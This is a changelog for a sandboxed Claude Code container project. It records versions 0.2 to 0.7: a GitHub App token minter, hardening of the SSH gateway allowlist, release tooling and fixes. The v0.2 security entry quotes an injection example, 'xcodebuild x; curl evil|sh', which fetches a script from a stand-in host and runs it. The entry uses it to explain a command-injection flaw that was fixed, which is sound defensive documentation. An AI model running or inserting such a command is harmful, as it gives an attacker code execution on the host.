# Changelog

All notable changes to `multiplai-container` are documented here.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
This repo is consumed **only at an immutable tag** — `multiplai-kit/setup.sh`
pins `CONTAINER_REF` and fetches a shallow single-tag checkout — so every entry
below describes what a consumer gets by advancing that pin. Tags are never
moved; fixes ship as a new tag.

Entries are hand-written and enforced: `release.sh` refuses to cut a tag while
`## [Unreleased]` is empty.

Notes start at `v0.2`. `v0.1` was the initial import of the repo (the
sandboxed Claude Code container) and predates this changelog.

## [Unreleased]

## [0.7] – 2026-07-30

### Added

- `multiplai-gh-token` — host-side minter for **GitHub App installation
  tokens**. Several Apps live side by side as named profiles under
  `~/.local/state/multiplai-gh-token/<app>/{app-id,app.pem,org}`; the App's
  private key never enters a container, which receives only a 1-hour `ghs_`
  token over the SSH bridge. Modes are enforced (700 dir, 600 files, no
  symlinks), every mint is audited to `mint.log`, and `--check` diagnoses a
  credential directory with **no network call and no token printed** — the
  form that is safe inside an agent transcript. Consumed by the kit's
  `GH_TOKEN_APP` mode; setup in `docs/gh-app-token.md`.
- Gateway allowlist branch for `multiplai-gh-token`: at most a leading
  `--json`/`--check` plus one app name, name validated against
  `[A-Za-z0-9._-]`, every other flag rejected, argv[0] pinned to
  `$HOME/.local/bin/multiplai-gh-token` (`~/.local/bin` is not on the login
  PATH the gateway resolves through). Twelve ALLOW/DENY cases in
  `tests/gateway-test.sh` cover it, including the argv[0] rewrite.
- `docs/gh-app-token.md` — host setup guide: creating and installing the App,
  the credential layout and permission recipe, the threat-model table, the
  settled Keychain / Secure-Enclave / 1Password rulings, transcript hygiene
  plus the self-revoke recipe, the audit log, and migration from the
  single-App predecessor `dolce-gh-token`.

- `CHANGELOG.md` (this file), backfilled for every existing tag, so a consumer
  can see what advancing `CONTAINER_REF` actually gets them.
- `SECURITY.md` — threat model of the optional macOS host bridge, supported
  versions, reporting address, and the gateway invariant contributors must
  preserve.
- `release.sh` changelog gate: a release is refused unless `## [Unreleased]`
  has content; on a real release the section is renamed to the new version,
  dated, given a compare link, and committed with the release commit. There is
  deliberately no `--skip-changelog`.
- CI (`.github/workflows/ci.yml`): syntax checks over every shipped script
  (`bash -n`, `zsh -n` for the gateway), `shellcheck` over the scripts that
  pass it cleanly, and the gateway allowlist test suite
  (`tests/gateway-test.sh`).

### Changed

- `README.md`: the `Files` table now lists every shipped file, including
  `md2pdf` and `tests/gateway-test.sh`; the intro no longer links the kit under
  the name "Multiplai" (the umbrella banner is the single suite pointer).
- `README.md` restructured usage-first: the standalone `docker run` quickstart
  now directly follows the intro, and the file inventory sits below all usage
  sections. The "Releasing (maintainers)" section moved to `CLAUDE.md` (which
  now carries the full flow, including the changelog gate); a one-line pointer
  remains in the README. The host-bridge security callout is unchanged, only
  repositioned.

[0.7]: https://github.com/spikelab/multiplai-container/compare/v0.6...v0.7

## [0.6] – 2026-07-26

### Fixed

- Host gateway: a `cd` prefix whose path contains spaces or parentheses now
  works — the workdir is unquoted through the same tokenizer as the rest of
  argv (previously it arrived `%q`-escaped and was used verbatim).
- `release.sh`: the kit-pin rewrite is mode-preserving. The v0.5 rewrite
  replaced the kit's `setup.sh` with a `0600` temp file and silently dropped
  its executable bit; the script now writes in place and verifies `-x`.
- `release.sh`: pushes are atomic (`git push --atomic main <tag>`), so a raced
  rejection can no longer leave an orphaned public tag, and no `eval` is used
  on any computed value.

### Added

- `tests/gateway-test.sh` — a 29-case ALLOW/DENY harness that runs the gateway
  the way `sshd` does, against stub commands. This is the only automated test
  of the container→host security boundary.
- `release.sh` preflight on the kit checkout: it refuses a kit that is not on
  `main` and in sync with `origin/main`, which rules out publishing from a
  runtime checkout (`~/.multiplai-runtimes/*`) or a stale clone.
- `README.md` links the Multiplai umbrella repo.

### Security

- The gateway's metacharacter deny-list is escape-aware: backslash-escaped
  characters travel only as argv data and are stripped before the check, while
  every unescaped metacharacter (and any raw newline) is still denied. No shell
  ever re-parses client input.
- The `xcsift` pipe suffix is honoured only on `swift`/`xcodebuild`/`xcrun`
  heads; `qmd`, `curl` and friends with that suffix are now denied.

[0.6]: https://github.com/spikelab/multiplai-container/compare/v0.5...v0.6

## [0.5] – 2026-07-15

### Added

- `release.sh` — build-gated release tooling that makes the two-repo release
  one command: refuse unless `main` is clean and in sync, require `docker
  build` to pass, tag, bump the kit's `CONTAINER_REF`, then push both repos
  back-to-back. Ships with `VERSION` (last released version) and `CLAUDE.md`
  (the repo's release contract and gateway invariant).
- The image exports `MULTIPLAI_CONTAINER=1`, so marketplace skills detect the
  container explicitly instead of inferring it from `uname` — and can decide
  whether host-bridge instructions belong in an error message.
- `sqlite3` CLI in the image.

### Changed

- PySceneDetect + headless OpenCV are no longer baked into the image. They were
  added for the `screen-demo` skill during this cycle and removed again before
  the tag, because the OpenCV wheel dominated the image size.

### Fixed

- Host gateway `PATH`: `qmd` resolves via `~/.bun/bin`, and nvm's node24 bin is
  prepended so `qmd`'s `better-sqlite3` finds the ABI it was built against
  (Homebrew node had drifted to 26).
- Host gateway allowlist: `swift-build`'s trusted `xcsift` pipe and
  `swift --version` are permitted.

### Documentation

- README: which skills work with and without the host bridge, and a note on
  `MULTIPLAI_CONTAINER`.

[0.5]: https://github.com/spikelab/multiplai-container/compare/v0.4...v0.5

## [0.4] – 2026-07-08

### Added

- Markdown → PDF toolchain baked into the image: `pandoc` + `typst` (two static
  binaries, no system deps) plus the `md2pdf` wrapper, so the canonical
  `pandoc --pdf-engine=typst` invocation is one command and a bare
  `pandoc -o x.pdf` (which would reach for the absent pdflatex) is not needed.
- Host gateway allowlist: `qmd` `search`/`index` subcommands.

### Fixed

- `venv-sync-entrypoint.sh` invokes pip as `python -m pip`.

[0.4]: https://github.com/spikelab/multiplai-container/compare/v0.3...v0.4

## [0.3] – 2026-07-06

### Security

- `ab` can no longer read host files through the real Chrome: the `file:`
  scheme is blocked on its navigation verbs (`open`/`goto`/`navigate`), closing
  the same exfiltration path the `curl` guard already covered. `agent-browser`
  was split out of the blanket allowlist to make this possible.
- `build.sh` refuses to build with the `.env.example` `WORKSPACE` placeholder or
  a non-existent path.
- README documents the host-bridge trust model prominently: enabling the bridge
  grants the container host-side code execution (Swift/Xcode build scripts and
  plugins) and host-file read (via Chrome) — not "a locked-down SSH shell".
- Host gateway: the `curl` flag allowlist blocks `-o`/`-T`/`-K`/`--unix-socket`
  and `@file`, and `pkill` is restricted to simulator/build process names.

### Fixed

- The Claude Code in-app auto-updater is disabled (the persistent
  `~/.claude-cli` mount owns updates); baked CLI bumped to 2.1.202.
- Standalone use works: the entrypoint no longer hard-requires
  `CLAUDE_MULTIPLAI_HOME` — the kit venv sync is skipped instead of aborting —
  and `.env.example` exists for the documented `cp .env.example .env` flow.
- Build portability and reproducibility: a colliding UID-1000 user is renamed
  to `agent` rather than ignored, the base image is pinned by digest, and the
  CLI/uv/bun/rust version args actually pin and bust cache.
- Host gateway tokenizer no longer corrupts multi-word arguments.
- `venv-sync-entrypoint.sh` distinguishes a platform skip from a transient
  install failure (a failed sync is no longer cached as done) and takes an
  atomic update lock so two containers sharing `~/.claude-cli` cannot race npm.
- `.dockerignore` added; `apple-containers-experiment.sh` marked executable.

[0.3]: https://github.com/spikelab/multiplai-container/compare/v0.2...v0.3

## [0.2] – 2026-07-05

### Security

- **Fixed a P0 container→host command injection in the SSH gateway (CWE-78).**
  The gateway exec'd the raw `$SSH_ORIGINAL_COMMAND` through `zsh -lc "$CMD"`
  after a prefix match, so any allowlisted prefix plus a shell metacharacter
  escaped the allowlist (`xcodebuild x; curl evil|sh`) — full host RCE from the
  sandbox. It now rejects shell metacharacters, tokenizes to argv honouring
  quotes only (no expansion), validates `argv[0]` and subcommand against the
  allowlist, handles an optional `cd DIR &&` itself, and execs the argv array
  as data so nothing re-enters a shell. `curl` is locked to http/https on
  loopback, and the `authorized_keys` guidance gained `restrict`.

### Added

- Self-updating Claude Code CLI: when a persistent dir is mounted at
  `~/.claude-cli`, the entrypoint keeps an npm-prefix install of
  `@anthropic-ai/claude-code` there, refreshed every
  `MULTIPLAI_CLI_UPDATE_DAYS` (default 7), and prefers it on `PATH`. No mount,
  or a failed update, falls back to the baked image version — no more
  rebuild-to-bump chore.

[0.2]: https://github.com/spikelab/multiplai-container/compare/v0.1...v0.2
